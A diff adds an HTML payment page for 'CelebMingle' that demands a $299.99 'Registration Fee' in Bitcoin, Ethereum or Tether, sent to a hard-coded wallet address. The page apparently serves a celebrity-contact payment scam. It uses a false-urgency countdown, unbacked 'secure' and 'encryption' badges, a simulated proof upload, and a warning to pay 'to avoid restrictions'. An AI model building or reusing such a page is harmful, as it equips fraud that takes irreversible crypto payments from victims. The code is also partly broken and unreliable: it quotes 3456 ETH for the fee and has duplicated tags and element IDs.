@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#1a1a2e">
+    <title>CelebMingle - Cryptocurrency Payment</title>
+    <link rel="stylesheet" href="styles/crypto.css">
+    <style>
+    /* Mobile-friendly paddings and card sizes for crypto-selection */
+    .crypto-container {
+        padding: 2rem 2rem;
+        max-width: 600px;
+        margin: auto;
+    }
+    .crypto-selection {
+        margin-top: 1.2rem;
+        padding: 1.5rem 1.5rem;
+        background: #111;
+        border-radius: 16px;
+    }
+    .crypto-selection .section-title {
+        color: #fff;
+    }
+    .crypto-card {
+        display: flex;
+        align-items: center;
+        padding: 1.2rem 1.2rem;
+        border-radius: 12px;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.13);
+        background: #000;
+        color: #fff;
+        transition: box-shadow 0.2s, border 0.2s, background 0.2s, color 0.2s;
+        cursor: pointer;
+        min-height: 80px;
+        font-size: 1.05rem;
+        border: 2px solid transparent;
+    }
+    .crypto-card:hover {
+        border: 2px solid #f39c12;
+        box-shadow: 0 4px 16px rgba(243,156,18,0.18);
+        background: #2d2d3a;
+        color: #fff;
+    }
+    .crypto-option input[type="radio"]:checked + label.crypto-card {
+        border: 2.5px solid #27ae60;
+        box-shadow: 0 6px 24px rgba(39,174,96,0.18);
+        background: #07070a;
+        color: #f7f7fa;
+        position: relative;
+        z-index: 1;
+    }
+    .crypto-option input[type="radio"]:checked + label.crypto-card .crypto-info h3,
+    .crypto-option input[type="radio"]:checked + label.crypto-card .crypto-info .crypto-symbol,
+    .crypto-option input[type="radio"]:checked + label.crypto-card .network-info,
+    .crypto-option input[type="radio"]:checked + label.crypto-card .crypto-rate {
+        color: #f7f7fa !important;
+        text-shadow: 0 2px 8px #000a;
+    }
+    .crypto-option input[type="radio"]:checked + label.crypto-card::after {
+        content: "Selected";
+        position: absolute;
+        top: 12px;
+        right: 18px;
+        background: #27ae60;
+        color: #6c4646;
+        font-size: 0.85rem;
+        padding: 0.2rem 0.7rem;
+        border-radius: 8px;
+        font-weight: 600;
+        letter-spacing: 0.03em;
+        box-shadow: 0 2px 8px #27ae6033;
+    }
+    .crypto-icon {
+        font-size: 2rem;
+        margin-right: 0.7rem;
+        color: #f39c12;
+    }
+    .crypto-info {
+        background: #000;
+        border-radius: 8px;
+        padding: 0.5rem 0.7rem;
+    }
+    .crypto-info h3, .crypto-info .crypto-symbol, .network-info, .crypto-rate {
+        color: #fff;
+    }
+    .selection-indicator {
+        margin-left: auto;
+        color: #27ae60;
+        font-size: 1.3rem;
+        opacity: 0.7;
+    }
+    .crypto-options {
+        display: flex;
+        flex-direction: column;
+        gap: 1.2rem;
+        background: #000;
+        border-radius: 12px;
+        padding: 0.7rem 0.7rem;
+    }
+    .crypto-info h3 {
+        font-size: 1.1rem;
+        margin-bottom: 0.2rem;
+    }
+    .crypto-info .crypto-symbol {
+        font-weight: bold;
+        color: #1a1a2e;
+        margin-right: 0.5rem;
+    }
+    .network-info {
+        font-size: 0.9rem;
+        color: #888;
+        margin-bottom: 0.2rem;
+    }
+    .crypto-rate {
+        font-size: 0.95rem;
+        color: #2d3436;
+    }
+    .selection-indicator {
+        margin-left: auto;
+        color: #27ae60;
+        font-size: 1.3rem;
+        opacity: 0.7;
+    }
+    /* Interactive hover effect */
+    .crypto-card:hover {
+        box-shadow: 0 4px 16px rgba(52,152,219,0.13);
+        border: 2px solid #3498db;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* --- MOBILE OPTIMIZATION --- */
+    @media (max-width: 600px) {
+      .crypto-container {
+        padding: 0.5rem 0.2rem !important;
+        max-width: 100vw !important;
+      }
+      .crypto-selection {
+        margin-top: 0.5rem !important;
+        padding: 0.5rem 0.2rem !important;
+        border-radius: 10px !important;
+      }
+      .crypto-header {
+        padding: 0.5rem 0.2rem !important;
+      }
+      .page-title {
+        font-size: 1.1rem !important;
+        margin-bottom: 0.3rem !important;
+      }
+      .subtitle {
+        font-size: 0.95rem !important;
+        margin-bottom: 0.3rem !important;
+      }
+      .mobile-instructions {
+        font-size: 0.93rem !important;
+        padding: 0.4rem 0.5rem !important;
+        border-radius: 8px !important;
+        margin: 0.5rem 0 !important;
+      }
+      .crypto-options {
+        gap: 0.4rem !important;
+        padding: 0.2rem 0.1rem !important;
+        border-radius: 8px !important;
+      }
+      .crypto-card {
+        padding: 0.4rem 0.2rem !important;
+        font-size: 0.85rem !important;
+        min-height: 48px !important;
+        border-radius: 7px !important;
+        line-height: 1.1 !important;
+      }
+      .crypto-icon {
+        font-size: 1.1rem !important;
+        margin-right: 0.25rem !important;
+      }
+      .crypto-info {
+        padding: 0.2rem 0.3rem !important;
+        border-radius: 5px !important;
+      }
+      .crypto-info h3 {
+        font-size: 0.93rem !important;
+        margin-bottom: 0.08rem !important;
+      }
+      .crypto-info .crypto-symbol {
+        font-size: 0.93rem !important;
+        margin-right: 0.2rem !important;
+      }
+      .network-info {
+        font-size: 0.8rem !important;
+        margin-bottom: 0.08rem !important;
+      }
+      .crypto-rate {
+        font-size: 0.85rem !important;
+      }
+      .selection-indicator {
+        font-size: 1.05rem !important;
+      }
+      .payment-instructions {
+        padding: 0.5rem 0.2rem !important;
+      }
+      .instruction-card {
+        padding: 0.7rem 0.5rem 0.5rem 0.5rem !important;
+        border-radius: 10px !important;
+      }
+      .wallet-address-section {
+        margin-bottom: 0.5rem !important;
+      }
+      .address-label, .amount-label {
+        font-size: 0.95rem !important;
+      }
+      #walletAddressText, .amount-value {
+        font-size: 0.95rem !important;
+        padding: 0.2rem 0.7rem !important;
+        border-radius: 7px !important;
+      }
+      .amount-warning {
+        font-size: 0.95rem !important;
+        margin-left: 0.3rem !important;
+      }
+      .payment-timer {
+        font-size: 0.93rem !important;
+        margin: 0.5rem 0 !important;
+      }
+      .countdown {
+        font-size: 1.1rem !important;
+      }
+      .proof-upload {
+        padding: 0.5rem 0.2rem !important;
+      }
+      .upload-content {
+        padding: 0.7rem 0.5rem !important;
+        min-height: 90px !important;
+        min-width: 120px !important;
+        border-radius: 10px !important;
+      }
+      .upload-btn {
+        padding: 0.4rem 1.1rem !important;
+        font-size: 0.93rem !important;
+        border-radius: 7px !important;
+      }
+      #selectedFiles {
+        font-size: 0.93rem !important;
+        margin-top: 0.3rem !important;
+      }
+      #uploadLoading, #uploadSuccess {
+        font-size: 0.93rem !important;
+        margin-top: 0.3rem !important;
+      }
+      #completePaymentBtn {
+        margin-top: 0.5rem !important;
+        padding: 0.5rem 1.2rem !important;
+        font-size: 0.95rem !important;
+        border-radius: 7px !important;
+      }
+      #paymentConfirmation {
+        margin-top: 0.5rem !important;
+        font-size: 0.95rem !important;
+      }
+      .security-features {
+        flex-direction: column !important;
+        gap: 0.3rem !important;
+        font-size: 0.93rem !important;
+      }
+      .security-item {
+        font-size: 0.93rem !important;
+      }
+      .modal-content {
+        padding: 1.1rem 1.2rem !important;
+        border-radius: 10px !important;
+        font-size: 0.95rem !important;
+      }
+    }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+  #celebHubLink { display: none; }
+</style>
+<script>
+// Hide hero section and Get Started button if logged in; show Celeb Hub if logged in
+document.addEventListener('DOMContentLoaded', function() {
+    var isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
+    if (isLoggedIn) {
+        // Hide hero/intro section if it exists
+        var hero = document.querySelector('.hero, .hero-section, .intro-section');
+        if (hero) hero.style.display = 'none';
+        // Hide Get Started button if it exists
+        var getStartedBtn = document.querySelector('button, a');
+        if (getStartedBtn && /get started/i.test(getStartedBtn.textContent)) {
+            getStartedBtn.style.display = 'none';
+        }
+        // Show Celeb Hub link if present
+        var celebHub = document.getElementById('celebHubLink');
+        if (celebHub) celebHub.style.display = 'inline-block';
+    }
+});
+</script>
+</head>
+<body>
+    <!-- Removed error message markup from top of page -->
+    <div class="crypto-wrapper" style="min-height:100vh;">
+    <!-- Remove any error message at the top of the page -->
+        <div class="crypto-container" aria-label="Cryptocurrency Payment Gateway">
+            <!-- Header Section -->
+            <div class="crypto-header">
+                <div class="logo-section" style="display:flex;align-items:center;justify-content:space-between;">
+                    <div style="display:flex;align-items:center;gap:1rem;">
+                        <img src="images/minglelogo.jpg" alt="CelebMingle" class="brand-logo">
+                        <div class="security-badge">
+                            <i class="fas fa-shield-check"></i>
+                            <span>Secure Crypto Payment</span>
+                        </div>
+                    </div>
+                    <a id="celebHubLink" href="celeb.html" style="background:#f39c12;color:#fff;padding:0.6rem 1.3rem;border-radius:10px;font-weight:700;font-size:1.08rem;text-decoration:none;box-shadow:0 2px 8px #f39c1233;transition:background 0.18s;">
+                        <i class="fas fa-star"></i> Celeb Hub
+                    </a>
+                </div>
+                <h1 class="page-title">Registration Fee</h1>
+                <p class="subtitle">Secure • Instant Verification</p>
+                <div class="mobile-instructions" style="margin:1rem 0; font-size:1rem; color:#f39c12; background:rgba(243,156,18,0.08); padding:0.75rem; border-radius:12px;">
+                  <strong>How to Pay with Crypto:</strong>
+                  <ol style="margin:0.5rem 0 0 1.2rem;">
+                    <li>Choose your preferred cryptocurrency.</li>
+                    <li>Send the exact amount to the wallet address shown.</li>
+                    <li>Upload proof for faster verification.</li>
+                  </ol>
+                </div>
+            </div>
+
+            <!-- Progress Indicator -->
+            <div class="progress-steps">
+               
+                <div class="step completed" aria-label="Step 2: Payment Method">
+                    <div class="step-number">1</div>
+                    <span>Method</span>
+                </div>
+                <div class="step active" aria-label="Step 3: Crypto Payment">
+                    <div class="step-number">2</div>
+                    <span>Crypto</span>
+                </div>
+                <div class="step" aria-label="Step 4: Verification">
+                    <div class="step-number">3</div>
+                    <span>Verify</span>
+                </div>
+            </div>
+
+          
+
+            <!-- Cryptocurrency Selection -->
+            <div class="crypto-selection">
+                <div class="section-title" style="font-size:1.5rem; display: flex; align-items: center; gap: 0.7rem; color: #fff; margin-bottom: 0.5rem;">
+                    <span style="background: #f39c12; color: #fff; border-radius: 50%; padding: 0.5rem; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 8px #f39c1233;">
+                        <i class="fab fa-bitcoin" style="font-size:1.7rem;"></i>
+                    </span>
+                    <span>1. Choose Cryptocurrency</span>
+                </div>
+                <div style="color: #f9e79f; font-size: 1.05rem; margin-bottom: 1.2rem; font-weight: 500; text-shadow: 0 2px 8px #0002;">
+                    Select your preferred crypto below to see payment details and instructions instantly.
+                </div>
+                <!-- Crypto Options -->
+                <div class="crypto-options">
+                  <div class="crypto-option">
+                    <input type="radio" id="btcOption" name="crypto" value="btc" style="display:none;" checked>
+                    <label for="btcOption" class="crypto-card" >
+                      <span class="crypto-icon"><i class="fab fa-bitcoin"></i></span>
+                      <div class="crypto-info" >
+                        <h3>Bitcoin</h3>
+                        <span class="crypto-symbol" style="color:#FFD700;">BTC</span>
+                        <span class="network-info" style="color:#FFD700;">Network: Bitcoin</span>
+                        <span class="crypto-rate" id="btcRate" style="color:#00fff2;">≈ 0.0025 BTC ($299.99 USD)
+                        </span>
+                      </div>
+                      <span class="selection-indicator"><i class="fas fa-check-circle"></i></span>
+                    </label>
+                  </div>
+                  <div class="crypto-option">
+                    <input type="radio" id="ethOption" name="crypto" value="eth" style="display:none;">
+                    <label for="ethOption" class="crypto-card">
+                      <span class="crypto-icon"><i class="fab fa-ethereum"></i></span>
+                      <div class="crypto-info">
+                        <h3>Ethereum</h3>
+                        <span class="crypto-symbol" style="color:#FFD700;">ETH</span>
+                        <span class="network-info" style="color:#FFD700;">Network: Ethereum</span>
+                        <span class="crypto-rate" id="ethRate" style="color:#00ffee;">≈ 0.080 ETH ($299.99 USD)</span>
+                      </div>
+                      <span class="selection-indicator"><i class="fas fa-check-circle"></i></span>
+                    </label>
+                  </div>
+                  <div class="crypto-option">
+                    <input type="radio" id="usdtOption" name="crypto" value="usdt" style="display:none;">
+                    <label for="usdtOption" class="crypto-card">
+                      <span class="crypto-icon"><img src="images/tether-logo.svg" alt="USDT" style="width:2rem;height:2rem;"></span>
+                      <div class="crypto-info">
+                        <h3>Tether (USDT)</h3>
+                        <span class="crypto-symbol" style="color:#FFD700;">USDT</span>
+                        <span class="network-info" style="color:#FFD700;">Network: TRC20</span>
+                        <span class="crypto-rate" id="usdtRate" style="color:#00f9f1;">≈ 299.99 USDT</span>
+                      </div>
+                      <span class="selection-indicator"><i class="fas fa-check-circle"></i></span>
+                    </label>
+                  </div>
+                </div>
+                
+              
+
+            <!-- Payment Instructions -->
+            <div class="payment-instructions">
+                <h2 class="section-title" style="font-size:1.3rem; margin-bottom:0.7rem; color:#fff; display:flex; align-items:center; gap:0.6rem;">
+                    <i class="fas fa-wallet" style="color:#FFD700;"></i>
+                    2. Wallet adress information
+                </h2>
+                <div class="instruction-card" id="paymentInstructions" style="background:linear-gradient(120deg,#181824 60%,#23233a 100%); border-radius:22px; box-shadow:0 4px 24px #000a; padding:2rem 1.5rem 1.5rem 1.5rem; margin-bottom:1.2rem; color:#f7f7fa;">
+                  <div class="wallet-address-section" style="margin-bottom:1.2rem;">
+                    <div style="display:flex; flex-direction:column; gap:1.1rem;">
+                      <div style="display:flex; align-items:center; gap:1.1rem; flex-wrap:wrap;">
+                        <span class="address-label" style="font-weight:700; color:#FFD700; font-size:1.18rem; letter-spacing:0.04em;">Wallet Address</span>
+                        <span id="walletAddressText" style="display:inline-flex; align-items:center; gap:0.5rem; font-size:1.13rem; font-family:'Segoe UI', monospace; color:#23243a; background:linear-gradient(90deg,#FFD700 0%,#fffbe6 100%); padding:0.38rem 1.2rem; border-radius:999px; font-weight:700; box-shadow:0 2px 12px #FFD70055,0 0 8px #f9e79f33; letter-spacing:0.04em; word-break:break-all;">
+                          <i class="fas fa-key" style="color:#0059f3; font-size:1.1em;"></i>
+                          <span id="dynamicWalletAddress">0xA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0</span>
+                        </span>
+                        <button class="copy-btn" onclick="copyAddress()" style="background:linear-gradient(90deg,#FFD700 0%,#f39c12 100%); color:#23243a; border:none; border-radius:8px; padding:0.45rem 1.1rem; font-size:1.08rem; font-weight:700; cursor:pointer; box-shadow:0 2px 8px #FFD70033; margin-left:0.5rem; transition:background 0.18s;"> <i class="fas fa-copy"></i> Copy </button>
+                      </div>
+                      <div style="display:flex; align-items:center; gap:1.1rem; flex-wrap:wrap;">
+                        <span class="amount-label" style="font-size:1.13rem; color:#27ae60; font-weight:700;">Exact Amount</span>
+                        <span class="amount-value" id="exactAmount" style="font-size:1.13rem; font-weight:700; color:#23243a; background:linear-gradient(90deg,#27ae60 0%,#fffbe6 100%); padding:0.38rem 1.2rem; border-radius:12px; letter-spacing:0.04em; box-shadow:0 2px 12px #27ae6033;">299.99 USDT</span>
+                        <span class="amount-warning" id="exactAmountWarning" style="color:#f39c12; font-size:1.13rem; font-weight:600; margin-left:0.7rem;">⚠️ Send <b>exact amount</b> only</span>
+                      </div>
+                    </div>
+                  </div>
+                  
+                </div>
+            </div>
+
+            <!-- Payment Timer -->
+            <div class="payment-timer">
+                <div class="timer-content">
+                    <i class="fas fa-hourglass-half"></i>
+                    <span>Payment expires in:</span>
+                    <div class="countdown" id="paymentCountdown">29:59</div>
+                </div>
+            </div>
+            <script>
+            // Countdown timer for payment
+            (function() {
+                var countdownEl = document.getElementById('paymentCountdown');
+                var totalSeconds = 29 * 60 + 59; // 29:59
+                function updateTimer() {
+                    var min = Math.floor(totalSeconds / 60);
+                    var sec = totalSeconds % 60;
+                    countdownEl.textContent = `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
+                    if (totalSeconds > 0) {
+                        totalSeconds--;
+                    } else {
+                        countdownEl.textContent = 'Expired';
+                        countdownEl.style.color = '#e74c3c';
+                        clearInterval(timerInterval);
+                    }
+                }
+                updateTimer();
+                var timerInterval = setInterval(updateTimer, 1000);
+            })();
+
+            // Fetch live rates and update UI
+            async function fetchLiveRates() {
+                // CoinGecko API: https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether&vs_currencies=usdt
+                const url = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether&vs_currencies=usdt';
+                try {
+                    const res = await fetch(url);
+                    const data = await res.json();
+                    return {
+                        btc: data.bitcoin.usdt,
+                        eth: data.ethereum.usdt,
+                        usdt: 1
+                    };
+                } catch (e) {
+                    // fallback to static rates if API fails
+                    return { btc: 24000, eth: 3000, usdt: 1 };
+                }
+            }
+
+            async function updateLiveCryptoUI() {
+                const rates = await fetchLiveRates();
+                const usdAmount = 299.99;
+                // Calculate amounts
+                // Use fixed BTC amount as requested
+                const btcAmount = 0.0026;
+                const ethAmount = 3456;
+                const usdtAmount = usdAmount.toFixed(2);
+
+                // Update selection cards
+                document.getElementById('btcRate').textContent = `≈ ${btcAmount} BTC ($299.99 USD)`;
+                document.getElementById('usdtRate').textContent = `${usdtAmount} USDT`;
+                document.getElementById('ethRate').textContent = `${ethAmount} ETH ($299.99 USD)`;
+
+                // Update payment instructions dynamically
+                const coinData = {
+                    btc: {
+                        address: 'bc1q4wfycd8xwfzn5y6zk77qsmjprf03wlx5gwf72x',
+                        amount: `${btcAmount} BTC`,
+                        warning: '⚠️ Send <b>exact amount</b> only'
+                    },
+                    usdt: {
+                        address: 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb',
+                        amount: `${usdtAmount} USDT`,
+                        warning: '⚠️ Send <b>exact amount</b> only'
+                    },
+                    eth: {
+                        address: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
+                        amount: `0.081 ETH`,
+                        warning: '⚠️ Send <b>exact amount</b> only'
+                    }
+                };
+                // Update payment instructions on selection
+                var coinRadios = document.querySelectorAll('input[name="crypto"]');
+                var walletAddressText = document.getElementById('dynamicWalletAddress');
+                var exactAmountText = document.getElementById('exactAmount');
+                var exactAmountWarning = document.getElementById('exactAmountWarning');
+                function updateNetworkInfo() {
+                    var selected = document.querySelector('input[name="crypto"]:checked');
+                    if (!selected) return;
+                    var coin = selected.value;
+                    if (coin === 'btc') {
+                        // ...networkText and cryptoWarning logic if needed...
+                    } else if (coin === 'usdt') {
+                        // ...networkText and cryptoWarning logic if needed...
+                    } else if (coin === 'eth') {
+                        // ...networkText and cryptoWarning logic if needed...
+                    }
+                    // Update wallet address and amount
+                    if (coinData[coin]) {
+                        walletAddressText.textContent = coinData[coin].address;
+                        exactAmountText.textContent = coinData[coin].amount;
+                        exactAmountWarning.innerHTML = coinData[coin].warning;
+                    } else {
+                        walletAddressText.textContent = 'N/A';
+                        exactAmountText.textContent = 'N/A';
+                        exactAmountWarning.innerHTML = '⚠️ Send <b>exact amount</b> only';
+                    }
+                }
+                coinRadios.forEach(function(radio) {
+                    radio.addEventListener('change', updateNetworkInfo);
+                });
+                updateNetworkInfo();
+            }
+            updateLiveCryptoUI();
+            </script>
+            </script>
+
+            <!-- Proof of Payment Upload -->
+            <div class="proof-upload">
+                <h2 class="section-title" style="font-size:1.3rem;">
+                    <i class="fas fa-camera"></i>
+                    4. Upload Proof of Payment
+                </h2>
+                
+                <div class="upload-card">
+                    <div class="upload-instructions">
+                        <p>Upload a screenshot or photo of your payment transaction for faster verification</p>
+                        <div class="upload-tips">
+                            <!-- Removed: Include transaction hash/ID tip -->
+                            <div class="tip-item">
+                                <i class="fas fa-check"></i>
+                                <span>Show payment amount clearly</span>
+                            </div>
+                            <div class="tip-item">
+                                <i class="fas fa-check"></i>
+                                <span>Ensure image is clear and readable</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="upload-area" id="uploadArea" style="cursor:pointer;">
+                        <div class="upload-content" id="uploadContent" style="display:flex; flex-direction:column; align-items:center; justify-content:center; gap:0.7rem; background:linear-gradient(90deg,#23233a 0%,#181824 100%); border-radius:18px; box-shadow:0 4px 24px #000a; padding:2rem 1.5rem; cursor:pointer; transition:box-shadow 0.18s, background 0.18s; min-height:180px; min-width:220px;">
+                            <div id="uploadUI">
+                                <i class="fas fa-cloud-upload-alt" style="font-size:2.2rem; color:#f39c12; margin-bottom:0.5rem;"></i>
+                                <h3 style="font-size:1.15rem; color:#fffbe6; font-weight:700; margin-bottom:0.2rem; letter-spacing:0.03em;">Drag &amp; Drop or <span style="color:#f39c12; text-decoration:underline; cursor:pointer;">Click to Upload</span></h3>
+                                <p style="color:#f9e79f; font-size:1rem; margin-bottom:0.7rem; font-weight:500; text-shadow:0 2px 8px #0002;">Support: JPG, PNG, PDF <span style="color:#e74c3c;">(Max 10MB)</span></p>
+                                <input type="file" id="proofFile" accept="image/*,.pdf" style="display:none;">
+                                <button class="upload-btn" id="chooseFilesBtn" style="background:linear-gradient(90deg,#f39c12 0%,#ffd700 100%); color:#23233a; border:none; border-radius:12px; padding:0.7rem 2.2rem; font-size:1.08rem; font-weight:700; cursor:pointer; box-shadow:0 2px 12px #f39c1233; margin-top:0.2rem; transition:background 0.2s; display:flex; align-items:center; gap:0.7rem;" type="button">
+                                    <i class="fas fa-plus"></i>
+                                    Choose Files
+                                </button>
+                                <div id="selectedFiles" style="margin-top:0.7rem; color:#27ae60; font-size:1rem; font-weight:600; display:none;"></div>
+                            </div>
+                            <div id="uploadLoading" style="margin-top:0.7rem; display:none; align-items:center; justify-content:center; flex-direction:column;">
+                                <div class="spinner" style="width:36px; height:36px; border:4px solid #f39c12; border-top:4px solid #fffbe6; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:0.5rem;"></div>
+                                <span style="color:#f39c12; font-size:1rem; font-weight:600;">Uploading...</span>
+                            </div>
+                            <div id="uploadPreview" style="margin-top:0.7rem; display:none; flex-direction:column; align-items:center; justify-content:center; gap:0.7rem;"></div>
+                            <button id="completePaymentBtn" style="display:none; margin-top:1.2rem; background:linear-gradient(90deg,#27ae60 0%,#2ecc71 100%); color:#fff; border:none; border-radius:12px; padding:0.8rem 2.5rem; font-size:1.13rem; font-weight:700; cursor:pointer; box-shadow:0 2px 12px #27ae6033; transition:background 0.2s;">Complete Payment</button>
+                            <div id="paymentConfirmation" style="display:none; margin-top:1.2rem; color:#27ae60; font-size:1.13rem; font-weight:700; text-align:center;"></div>
+                        </div>
+    <script>
+    // Enhanced upload: drag & drop, click, preview, uploading effect
+    document.addEventListener('DOMContentLoaded', function() {
+        var uploadArea = document.getElementById('uploadArea');
+        var uploadContent = document.getElementById('uploadContent');
+        var proofFile = document.getElementById('proofFile');
+        var chooseFilesBtn = document.getElementById('chooseFilesBtn');
+        var selectedFiles = document.getElementById('selectedFiles');
+        var uploadLoading = document.getElementById('uploadLoading');
+        var uploadPreview = document.getElementById('uploadPreview');
+        var uploadUI = document.getElementById('uploadUI');
+        // Click to open file dialog
+        if (chooseFilesBtn && proofFile) {
+            chooseFilesBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                proofFile.click();
+            });
+        }
+        // Click anywhere in area
+        if (uploadArea && proofFile) {
+            uploadArea.addEventListener('click', function(e) {
+                if (e.target === proofFile || e.target.closest('button')) return;
+                proofFile.click();
+            });
+        }
+        // Drag & drop
+        if (uploadArea && proofFile) {
+            uploadArea.addEventListener('dragover', function(e) {
+                e.preventDefault();
+                uploadContent.style.boxShadow = '0 6px 32px #FFD70055';
+                uploadContent.style.background = 'linear-gradient(90deg,#23233a 0%,#23243a 100%)';
+            });
+            uploadArea.addEventListener('dragleave', function(e) {
+                e.preventDefault();
+                uploadContent.style.boxShadow = '0 4px 24px #000a';
+                uploadContent.style.background = 'linear-gradient(90deg,#23233a 0%,#181824 100%)';
+            });
+            uploadArea.addEventListener('drop', function(e) {
+                e.preventDefault();
+                uploadContent.style.boxShadow = '0 4px 24px #000a';
+                uploadContent.style.background = 'linear-gradient(90deg,#23233a 0%,#181824 100%)';
+                if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
+                    proofFile.files = e.dataTransfer.files;
+                    handleFileChange();
+                }
+            });
+        }
+        // File input change
+        if (proofFile) {
+            proofFile.addEventListener('change', handleFileChange);
+        }
+        function handleFileChange() {
+            if (!proofFile.files || proofFile.files.length === 0) {
+                selectedFiles.textContent = '';
+                selectedFiles.style.display = 'none';
+                uploadLoading.style.display = 'none';
+                uploadPreview.style.display = 'none';
+                uploadUI.style.display = 'block';
+                document.getElementById('completePaymentBtn').style.display = 'none';
+                document.getElementById('paymentConfirmation').style.display = 'none';
+                return;
+            }
+            var file = proofFile.files[0];
+            // Validate type and size
+            var validTypes = ['image/jpeg', 'image/png', 'application/pdf'];
+            if (!validTypes.includes(file.type)) {
+                alert('Only JPG, PNG, or PDF files are allowed.');
+                proofFile.value = '';
+                return;
+            }
+            if (file.size > 10 * 1024 * 1024) {
+                alert('File size must be less than 10MB.');
+                proofFile.value = '';
+                return;
+            }
+            selectedFiles.textContent = 'Selected: ' + file.name;
+            selectedFiles.style.display = 'block';
+            uploadUI.style.display = 'none';
+            uploadPreview.style.display = 'none';
+            uploadLoading.style.display = 'flex';
+            // Simulate upload
+            setTimeout(function() {
+                uploadLoading.style.display = 'none';
+                // Show preview
+                if (file.type.startsWith('image/')) {
+                    var reader = new FileReader();
+                    reader.onload = function(e) {
+                        uploadPreview.innerHTML = '<img src="' + e.target.result + '" alt="Uploaded Image" style="max-width:220px; max-height:180px; border-radius:12px; box-shadow:0 2px 12px #27ae6033;">';
+                        uploadPreview.style.display = 'flex';
+                        document.getElementById('completePaymentBtn').style.display = 'block';
+                        document.getElementById('paymentConfirmation').style.display = 'none';
+                    };
+                    reader.readAsDataURL(file);
+                } else if (file.type === 'application/pdf') {
+                    uploadPreview.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;"><i class="fas fa-file-pdf" style="font-size:2.5rem;color:#e74c3c;"></i><span style="color:#e74c3c;font-weight:600;">PDF Uploaded</span></div>';
+                    uploadPreview.style.display = 'flex';
+                    document.getElementById('completePaymentBtn').style.display = 'block';
+                    document.getElementById('paymentConfirmation').style.display = 'none';
+                }
+            }, 1500);
+        }
+        // Complete Payment button logic
+        var completePaymentBtn = document.getElementById('completePaymentBtn');
+        var paymentConfirmation = document.getElementById('paymentConfirmation');
+        if (completePaymentBtn) {
+            completePaymentBtn.addEventListener('click', function() {
+                // Try to save form data from register.html if available in opener or parent
+                try {
+                    var regForm = null;
+                    // Try to find the register form in the opener or parent window
+                    if (window.opener && window.opener.document) {
+                        regForm = window.opener.document.querySelector('form');
+                    } else if (window.parent && window.parent !== window && window.parent.document) {
+                        regForm = window.parent.document.querySelector('form');
+                    } else {
+                        regForm = document.querySelector('form');
+                    }
+                    if (regForm) {
+                        var formData = {};
+                        Array.from(regForm.elements).forEach(function(el) {
+                            if (el.name && (el.type !== 'password' && el.type !== 'file')) {
+                                formData[el.name] = el.value;
+                            }
+                        });
+                        localStorage.setItem('registerFormData', JSON.stringify(formData));
+                    }
+                } catch (e) { /* ignore */ }
+                // Set docUploaded flag for register.html
+                localStorage.setItem('docUploaded', 'true');
+                completePaymentBtn.style.display = 'none';
+                paymentConfirmation.innerHTML = '<i class="fas fa-check-circle"></i> Make sure you made payment, to avoid retrictions  <br>We will get back to you via email.';
+                paymentConfirmation.style.display = 'block';
+                // Show countdown
+                var countdown = 5;
+                var countdownSpan = document.createElement('span');
+                countdownSpan.style.display = 'block';
+                countdownSpan.style.fontSize = '1.1em';
+                countdownSpan.style.color = '#f39c12';
+                countdownSpan.style.marginTop = '0.7em';
+                countdownSpan.textContent = 'Please wait... ' + countdown;
+                paymentConfirmation.appendChild(countdownSpan);
+                var interval = setInterval(function() {
+                    countdown--;
+                    if (countdown > 0) {
+                        countdownSpan.textContent = 'Please wait... ' + countdown;
+                    } else {
+                        countdownSpan.textContent = 'Redirecting...';
+                        clearInterval(interval);
+                        setTimeout(function() {
+                            window.location.href = 'register.html';
+                        }, 500);
+                    }
+                }, 1000);
+            });
+        }
+    });
+    </script>
+<div id="uploadLoading" style="margin-top:0.7rem; display:none; align-items:center; justify-content:center; flex-direction:column;">
+    <div class="spinner" style="width:36px; height:36px; border:4px solid #f39c12; border-top:4px solid #fffbe6; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:0.5rem;"></div>
+    <span style="color:#f39c12; font-size:1rem; font-weight:600;">Uploading...</span>
+</div>
+<div id="uploadSuccess" style="margin-top:0.7rem; display:none; color:#27ae60; font-size:1rem; font-weight:700;">
+    <i class="fas fa-check-circle"></i> Uploaded!
+</div>
+                    </div>
+                    
+                    <div class="uploaded-files" id="uploadedFiles" style="display: none;">
+                        <h4>Uploaded Files:</h4>
+                        <div class="file-list" id="fileList"></div>
+                    </div>
+                </div>
+            </div>
+
+           
+            <!-- Action Buttons -->
+           
+
+            <!-- Status Section -->
+            <div class="payment-status" id="paymentStatus" style="display: none;">
+                <h2 class="section-title">
+                    <i class="fas fa-chart-line"></i>
+                    Payment Status
+                </h2>
+                
+                <div class="status-card">
+                    <div class="status-content" id="statusContent">
+                        <!-- Status will be populated by JavaScript -->
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Features -->
+            <div class="security-features">
+                <div class="security-item">
+                    <i class="fas fa-lock"></i>
+                    <span>End-to-End Encryption</span>
+                </div>
+                <div class="security-item">
+                    <i class="fas fa-user-shield"></i>
+                    <span>Anonymous Payments</span>
+                </div>
+                <div class="security-item">
+                    <i class="fas fa-clock"></i>
+                    <span>24/7 Support</span>
+                </div>
+                <div class="security-item">
+                    <i class="fas fa-undo"></i>
+                    <span>Instant Access</span>
+                </div>
+            </div>
+
+           
+        </div>
+    </div>
+
